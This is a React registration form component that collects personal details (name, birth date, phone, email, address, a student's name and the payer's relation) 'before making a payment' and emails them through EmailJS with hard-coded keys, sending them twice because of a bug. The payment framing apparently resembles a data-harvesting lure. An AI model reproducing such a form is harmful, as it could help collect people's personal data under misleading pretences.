import React, { useState } from 'react';
import { Container, Row, Col, Form, Button, Modal } from 'react-bootstrap';
import emailjs from 'emailjs-com';
import Navbar from './Navbar';
import Footer from './Footer';

const RegistrationForm = () => {
  const [showConfirmModal, setShowConfirmModal] = useState(false);
  const [showSuccessModal, setShowSuccessModal] = useState(false);
  const [formValues, setFormValues] = useState({
    firstName: '',
    lastName: '',
    month: '',
    day: '',
    year: '',
    phoneNumber: '',
    email: '',
    studentName: '',
    relation: '',
    streetAddress: '',
    streetAddress2: '',
    city: '',
    state: '',
    postalCode: ''
  });

  const handleInputChange = (e) => {
    const { name, value } = e.target;

    if (name === 'month' || name === 'day' || name === 'year') {
      handleNumberInputChange(e);
    } else {
      setFormValues({ ...formValues, [name]: value });
    }
  };

  const handleNumberInputChange = (e) => {
    const { name, value } = e.target;

    if (name === 'month' && (value === '' || (value >= 1 && value <= 12))) {
      setFormValues({ ...formValues, [name]: value });
    } else if (name === 'day' && (value === '' || (value >= 1 && value <= 31))) {
      setFormValues({ ...formValues, [name]: value });
    } else if (name === 'year') {
      if (/^\d{0,4}$/.test(value)) {
        setFormValues({ ...formValues, [name]: value });
      }
    }
  };

  const handlePhoneNumberChange = (e) => {
    const { name, value } = e.target;
    if (/^[\d()+_\s-]*$/.test(value)) {
      setFormValues({ ...formValues, [name]: value });
    }
  };

  const handleSubmit = (e) => {
    e.preventDefault();
    sendEmail();
    setShowConfirmModal(true);
  };

  const handleConfirm = () => {
    sendEmail();
    setShowConfirmModal(false);
    setShowSuccessModal(true);
  };

  const sendEmail = () => {

    const templateParams = {
      firstName: formValues.firstName,
      lastName: formValues.lastName,
      month: formValues.month,
      day: formValues.day,
      year: formValues.year,
      phoneNumber: formValues.phoneNumber,
      email: formValues.email,
      studentName: formValues.studentName,
      relation: formValues.relation,
      streetAddress: formValues.streetAddress,
      streetAddress2: formValues.streetAddress2,
      city: formValues.city,
      state: formValues.state,
      postalCode: formValues.postalCode
    };
    

    emailjs.send(
      'service_e234qa4', // Replace with your service ID
      'template_7eyr14q', // Replace with your template ID
      templateParams,
      'aM4ACgzNEz-ykB_dV' // Replace with your user ID
    ).then((response) => {
      console.log('Email successfully sent!', response.status, response.text);
    }).catch((err) => {
      console.error('Error sending email:', err);
    });
  };

  const handleSuccessClose = () => {
    setShowSuccessModal(false);
    setFormValues({
      firstName: '',
      lastName: '',
      month: '',
      day: '',
      year: '',
      phoneNumber: '',
      email: '',
      studentName: '',
      relation: '',
      streetAddress: '',
      streetAddress2: '',
      city: '',
      state: '',
      postalCode: ''
    });
  };

  return (
    <div>
    <Navbar />
    <Container className="d-flex justify-content-center align-items-center min-vh-100">
      <Row>
        <Col md={8} lg={6} className="p-4 border rounded shadow-sm bg-light">
          <div className="border border-2 p-2" >
          <p2 className="p-0">You are required to fill in your details before making a payment, in accordance with school policy.</p2>
          </div>
          <h2 className="text-center my-4">Registration</h2>
          <p className="text-center mb-4">Enter only correct details to avoid <span style={{color: "#FF0000"}}>error(s)</span></p>
          <Form onSubmit={handleSubmit}>
            <Form.Group controlId="formFirstName">
              <Form.Label>First Name</Form.Label>
              <Form.Control type="text" placeholder="First Name" name="firstName" value={formValues.firstName} onChange={handleInputChange} required />
            </Form.Group>

            <Form.Group controlId="formLastName" className="mt-2">
              <Form.Label>Last Name</Form.Label>
              <Form.Control type="text" placeholder="Last Name" name="lastName" value={formValues.lastName} onChange={handleInputChange} required />
            </Form.Group>

            <Form.Group controlId="formBirthDate" className="mt-2">
              <Form.Label>Birth Date</Form.Label>
              <Row>
                <Col>
                  <Form.Control type="text" placeholder="Month" name="month" value={formValues.month} onChange={handleInputChange} required />
                </Col>
                <Col>
                  <Form.Control type="text" placeholder="Day" name="day" value={formValues.day} onChange={handleInputChange} required />
                </Col>
                <Col>
                  <Form.Control type="text" placeholder="Year" name="year" value={formValues.year} onChange={handleInputChange} required />
                </Col>
              </Row>
            </Form.Group>

            <Form.Group controlId="formPhoneNumber" className="mt-2">
              <Form.Label>Phone Number</Form.Label>
              <Form.Control type="text" placeholder="(000) 000-0000" name="phoneNumber" value={formValues.phoneNumber} onChange={handlePhoneNumberChange} required />
            </Form.Group>

            <Form.Group controlId="formEmail" className="mt-2">
              <Form.Label>E-mail Address</Form.Label>
              <Form.Control type="email" placeholder="example@example.com" name="email" value={formValues.email} onChange={handleInputChange} required />
            </Form.Group>

            <Form.Group controlId="formToWhom" className="mt-4">
              <Form.Label>To Whom Are You Paying For</Form.Label>
              <Form.Control type="text" placeholder="Enter the student's name" name="studentName" value={formValues.studentName} onChange={handleInputChange} required />
            </Form.Group>

            <Form.Group controlId="formRelation" className="mt-4">
              <Form.Label>Who is person to you</Form.Label>
              <Form.Check type="radio" label="Wife" name="relation" value="Wife" checked={formValues.relation === 'Wife'} onChange={handleInputChange} required />
              <Form.Check type="radio" label="Husband" name="relation" value="Husband" checked={formValues.relation === 'Husband'} onChange={handleInputChange} required />
              <Form.Check type="radio" label="Sister / Brother" name="relation" value="Sister / Brother" checked={formValues.relation === 'Sister / Brother'} onChange={handleInputChange} required />
              <Form.Check type="radio" label="Friend" name="relation" value="Friend" checked={formValues.relation === 'Friend'} onChange={handleInputChange} required />
            </Form.Group>

            <Form.Group controlId="formAddress" className="mt-4">
              <Form.Label>Mailing Address</Form.Label>
              <Form.Control type="text" placeholder="Street Address" name="streetAddress" value={formValues.streetAddress} onChange={handleInputChange} required className="mb-2" />
              <Form.Control type="text" placeholder="Street Address Line 2" name="streetAddress2" value={formValues.streetAddress2} onChange={handleInputChange} className="mb-2" />
              <Form.Control type="text" placeholder="City" name="city" value={formValues.city} onChange={handleInputChange} required className="mb-2" />
              <Form.Control type="text" placeholder="State / Province" name="state" value={formValues.state} onChange={handleInputChange} required className="mb-2" />
              <Form.Control type="text" placeholder="Postal / Zip Code" name="postalCode" value={formValues.postalCode} onChange={handleInputChange} required />
            </Form.Group>

            <Button variant="primary" type="submit" className="mt-4 w-100">
              SUBMIT
            </Button>
          </Form>
        </Col>
      </Row>

      <Modal show={showConfirmModal} onHide={() => setShowConfirmModal(false)}>
        <Modal.Header closeButton>
          <Modal.Title>Confirm Your Details</Modal.Title>
        </Modal.Header>
        <Modal.Body>
          <p>Please confirm and check your details before submitting to avoid <span style={{color: "#FF0000"}}>error(s)</span></p>
          <Button variant="primary" onClick={handleConfirm}>
            Yes, I Have Confirmed
          </Button>
        </Modal.Body>
      </Modal>

      <Modal show={showSuccessModal} onHide={handleSuccessClose}>
        <Modal.Header closeButton>
          <Modal.Title>Confirmation</Modal.Title>
        </Modal.Header>
        <Modal.Body>
          <p>Please check your email; you will receive a message shortly.</p>
        </Modal.Body>
        <Modal.Footer>
          <Button variant="primary" onClick={handleSuccessClose}>
            OK
          </Button>
        </Modal.Footer>
      </Modal>
    </Container>
    <Footer />
    </div>
  );
};

export default RegistrationForm;
